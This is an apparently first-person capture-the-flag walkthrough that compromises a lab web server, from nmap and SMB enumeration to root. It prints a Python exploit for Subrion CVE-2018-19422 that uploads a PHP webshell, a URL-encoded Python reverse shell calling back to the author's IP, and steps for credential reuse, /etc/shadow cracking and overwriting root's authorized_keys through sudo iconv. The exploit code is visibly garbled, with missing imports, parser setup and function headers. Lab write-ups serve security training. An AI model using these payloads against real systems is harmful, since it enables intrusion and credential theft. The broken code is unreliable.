I performed an aggressive TCP port scan using the command sudo nmap -sV -A 10.10.52.216 -p 22,80,139,445 and obtained the result shown above. The web application on port 80 returns the default Apache webpage, and it is running Apache 2.4.18. The SMB scan shows the hostname is techsupport. Other than that, the target machine is running Linux Ubuntu as the OS.


I performed a scan against the web server on port 80 by running the command nikto -h http://10.10.52.216 -Tuning b -C all and obtained the result shown above. This scan detected there is Wordpress application, as /wordpress/ directories were detected. Time to enumerate the different ports now. I will firstly enumerate the SMB application.

enum4linux complete on Sat Sep 21 14:33:12 2024

I enumerated the SMB first by running the command enum4linux 10.10.52.216 and obtained the result shown above. This scan contains a wealth of information about the SMB application. Two important details are the following:

  1. There is a user called scamsite on the target machine.
  2. There is a SMB share by the name websvr. I only have read access, but not write access.


I connected to the SMB share websvr by running the command smbclient //10.10.52.216/websvr and my password. And bingo. Now I have access. Inside this share, there is a file by the name enter.txt. I ran the command enter.txt to download this file to my machine successfully. Time to check what this file contains.


I ran the command cat enter.txt to output what is inside this file, and obtained the result shown above. This enter.txt contains the encoded credentials for Subrion. This file also mentions to fix Subrion site as /subrion does not work, and it is editable from panel. I will need to perform a directory search to find this. Also, the credentials admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk is useful. The password is encoded via magical formula. Maybe I can crack this using the Magic recipe from Cyberchef. Time to crack it.


Using Cyberchef and the Magic recipe, I managed to decode the password and obtain the result Scam2021 as shown above. Now I have the credentials admin:Scam2021 for the Subrion application. Time to enumerate the web application on the web server.

Port 80: HTTP

The default Apache webpage shown above is returned for this application. I viewed the source-code of the webpage but I did not find anything useful. Time to perform a directory search now.


I performed a directory search using the command gobuster dir -u http://10.10.52.216/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html,txt and obtained the entries shown above. There are two interesting entries: /wordpress and /test.


I browsed to http://10.10.52.216/wordpress/ and the webpage above was returned to me. I viewed the source-code of the webpage but I did not find anything useful like developer comments and hardcoded credentials. Since this is Wordpress application, I can enumerate this application using tools such as wpscan.


I ran the command wpscan --url http://10.10.52.216/wordpress -e u to identify all users of the Wordpress application and successfully identified the user support. I tried to bruteforce the password of this user for the Wordpress application using the command wpscan --url http://10.10.52.216/wordpress --passwords /usr/share/wordlists/rockyou.txt and had no luck. I performed a further scan to identify all plugins using the command wpscan --url http://10.10.52.216/wordpress --plugins-detection aggressive and got nothing either. The Wordpress version is 5.7.2 and it has multiple vulnerabilities. Before exploiting any vulnerabilities, I wish to enumerate further.


I browsed to http://10.10.52.216/subrion/ on my attack machine, but the Unable to connect error message was returned to me. I ran the command curl http://10.10.52.216/subrion and obtained the result shown above. The redirection was to http://10.0.2.15/subrion/subrion/ instead. This could be a redirection setup to prevent the subrion CMS showing up. I can perform a directory search against this.


I ran the command gobuster dir -u http://10.10.52.216/subrion/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html,txt -s 200 -b "" and obtained the result shown above. In the note I found previously, it mentioned the edit from panel. Maybe this is the panel? I viewed the different entires, but I did not find anything useful.


I browsed to http://10.10.52.216/subrion/panel.php and the login webpage was returned to me. I notice the application version is 4.2.1. From past experience, I know this application version is vulnerable to Authenticated File Upload (CVE-2018-19422) attack. If the credentials I obtained earlier works here, I can use it to exploit this CMS application. Time to test theadmin:Scam2021 credentials to login now.


And bingo. It works. Now I have access to the CMS application as the user admin. I can exploit this web application now.


I did a Google search for Subrion 4.2.1 exploits on Google and obtained the Github repository shown above. This repository contains the exploit and can be found here. I made a copy of the exploit to my machine and saved it as exp.py. Time to put the exploit to test.

Exploitation

**Foothold: Owning the Subrion 4.2.1 CMS via Authenticated File Upload Attack (CVE-2018-19422) **

import requests

parser.add_option('-p', '--passw', action="store", dest="passw", help="Password credential to login")

options, args = parser.parse_args()

if not options.url or not options.user or not options.passw:

    print('[+] Example help usage: exploit.py -h')
    exit()

url_login = options.url
url_upload = options.url + 'uploads/read.json'
url_shell = options.url + 'uploads/'
username = options.user
password = options.passw

session = requests.Session()

def login():
    global csrfToken
    print('[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 \n')
    print('[+] Trying to connect to: ' + url_login)
    try:
        get_token_request = session.get(url_login)
        soup = BeautifulSoup(get_token_request.text, 'html.parser')
        csrfToken = soup.find('input',attrs = {'name':'__st'})['value']
        print('[+] Success!')
        time.sleep(1)

        if csrfToken:
            print(f"[+] Got CSRF token: {csrfToken}")
            print("[+] Trying to log in...") 

            auth_url = url_login
            auth_cookies = {"loader": "loaded"}
            auth_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://192.168.1.20", "Connection": "close", "Referer": "http://192.168.1.20/panel/", "Upgrade-Insecure-Requests": "1"}
            auth_data = {"__st": csrfToken, "username": username, "password": password}
            auth = session.post(auth_url, headers=auth_headers, cookies=auth_cookies, data=auth_data)

            if len(auth.text) <= 7000:
                print('\n[x] Login failed... Check credentials')
                exit()
            else:
                print('[+] Login Successful!\n')
        else:
            print('[x] Failed to got CSRF token')
            exit()

    except requests.exceptions.ConnectionError as err:
        print('\n[x] Failed to Connect in: '+url_login+' ')
        print('[x] This host seems to be Down')
        exit()

    return csrfToken

    global shell_name 
    print('[+] Generating random name for Webshell...')
    shell_name = ''.join((random.choice(string.ascii_lowercase) for x in range(15)))
    time.sleep(1)  
    print('[+] Generated webshell name: '+shell_name+'\n')

    return shell_name

def shell_upload():
    print('[+] Trying to Upload Webshell..')
    try:
        up_url = url_upload
        up_cookies = {"INTELLI_06c8042c3d": "15ajqmku31n5e893djc8k8g7a0", "loader": "loaded"}
        up_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "*/*", "Accept-Language": "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=---------------------------6159367931540763043609390275", "Origin": "http://192.168.1.20", "Connection": "close", "Referer": "http://192.168.1.20/panel/uploads/"}
        up_data = "-----------------------------6159367931540763043609390275\r\nContent-Disposition: form-data; name=\"reqid\"\r\n\r\n17978446266285\r\n-----------------------------6159367931540763043609390275\r\nContent-Disposition: form-data; name=\"cmd\"\r\n\r\nupload\r\n-----------------------------6159367931540763043609390275\r\nContent-Disposition: form-data; name=\"target\"\r\n\r\nl1_Lw\r\n-----------------------------6159367931540763043609390275\r\nContent-Disposition: form-data; name=\"__st\"\r\n\r\n"+csrfToken+"\r\n-----------------------------6159367931540763043609390275\r\nContent-Disposition: form-data; name=\"upload[]\"; filename=\""+shell_name+".phar\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php system($_GET['cmd']); ?>\n\r\n-----------------------------6159367931540763043609390275\r\nContent-Disposition: form-data; name=\"mtime[]\"\r\n\r\n1621210391\r\n-----------------------------6159367931540763043609390275--\r\n"
        session.post(up_url, headers=up_headers, cookies=up_cookies, data=up_data)
    
    except requests.exceptions.HTTPError as conn:
        print('[x] Failed to Upload Webshell in: '+url_upload+' ')
        exit()

def code_exec():
    try:
        url_clean = url_shell.replace('/panel', '')
        req = session.get(url_clean + shell_name + '.phar?cmd=id')

        if req.status_code == 200:
            print('[+] Upload Success... Webshell path: ' + url_shell + shell_name + '.phar \n')
            while True:
                cmd = input('$ ')
                x = session.get(url_clean + shell_name + '.phar?cmd='+cmd+'')
                print(x.text)
        else:
            print('\n[x] Webshell not found... upload seems to have failed')
    except:
        print('\n[x] Failed to execute PHP code...')

login()
name_rnd()
shell_upload()

The Python code is shown above for this exploit. After saving the exploit on my machine, time to run it against the web server.


I ran the exploit using the command python3 exp.py -u http://10.10.52.216/subrion/panel/ -l admin -p Scam2021 and obtained a hit, as shown above. I achieved Remote Code Execution (RCE) now using this exploit session. Time to invoke a reverse shell connection to my machine now. I started a listener on my machine at port 8443 using the command nc -lvnp 8443. Since this exploit uses the web to deploy its payload, I will need to URL encode my reverse shell.


On the exploit session, I deployed the URL encoded Python reverse shell script python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.14.87.142%22%2C8443%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22%2Fbin%2Fbash%22%29%27 and got a hit, as shown above. Now I have a foothold on the target machine as the user www-data. Time to elevate my privileges on the web server.

Privilege Escalation

Horizontal Privilege Escalation: user www-data to user scamsite via Credential Hunting Inside wp-config.php

During my enumeration phase, I noticed there is a Wordpress application. I found one user on the website called support, but I was unable to bruteforce their password. Now I have compromised the web server, I viewed the wp-config.php at /var/www/html/wordpress/ and obtained the password ImAScammerLOL!123! of the MySQL database application. Also, during my SMB enumeration phase, I identified another user by the name scamsite on the web server.


I tried to switch to this user scamsite using the password ImAScammerLOL!123! via su scamsite and got a hit as shown above. I have successfully elevated my privileges on the target machine from www-data to scamsite.


To obtain a stable access on the web server, I SSHed into the web server as the user scamsite using the password ImAScammerLOL!123! as shown above. Now I have a stable foothold. Time to obtain root privileges.

Vertical Privilege Escalation: Abusing /usr/bin/conv with Sudo Privileges to Overwrite the root user's SSH Public Key


I ran the command sudo -l and the password ImAScammerLOL!123!, as the user scamsite and obtained the interesting information shown above. This user can execute the command /usr/bin/iconv with root privileges. This binary is used to read/write arbitrary files on the machine. The possible privilege escalation vectors are to read the sensitive files such as /etc/shadow to crack the root password, obtain the id_rsa (SSH key) belonging to the user root, etc. Since this binary allows write too. Maybe append a new user inside the /etc/passwd, overwrite the id_rsa SSH key of the user root, etc. To obtain even higher privileges, I obtained the /etc/shadow and /etc/passwd fiiles to my attack machine. Then I ran the command unshadow passwd shadow to obtain the hash of the root user:

root:$6$.jnArnoS$vhMAUiCBPWNT/G69DcbUJiD93STewGXfZybhl15/3B2h4H9iuwQVk4o77eHVD5.aDPWQEZgR22FFPvzgsQ/KV1:0:0:root:/root:/bin/bash                                                                                                               

root:$6$.jnArnoS$vhMAUiCBPWNT/G69DcbUJiD93STewGXfZybhl15/3B2h4H9iuwQVk4o77eHVD5.aDPWQEZgR22FFPvzgsQ/KV1:0:0:root:/root:/bin/bash

I saved the password hash shown above on my machine as unshadow and ran the command hashcat -m 1800 -a 0 -r /usr/share/hashcat/rules/best64.rule unshadow /usr/share/wordlists/rockyou.txt --force to crack it. But this was taking forever. While waiting, I tried another privilege escalation vector: overwriting the SSH key belonging to user root.


On my machine, I ran the command ssh-keygen to generate a new SSH key pair. I saved the content as tech_root. Now I will need to overwrite the /root/.ssh/authorized_keys on the target machine with the tech_root.pub I just generated on my machine.


Then on the target machine, I ran the command echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAneK4r/cWSGFnYbHghPLPUJLjiVJD27fbVG5S3dkvqx kali@kali" | sudo -u root /usr/bin/iconv -f 8859_1 -t 8859_1 -o "/root/.ssh/authorized_keys" to overwrite the /root/.ssh/authorized_keys content with my new key. Time to login as the user root with tech_root key.


And bingo. I ran the command ssh root@10.10.83.163 -i tech_root to connect as the user root on the target machine. Now I have a root shell with root privileges on the web server :)

Flag


There is only one flag to capture: root.txt. This is located inside the /root directory. There is no need to obtain a root shell to capture this flag, as the command sudo /usr/bin/iconv -f 8859_1 -t 8859_1 /root/root.txt can be executed instead to read the flag contents.
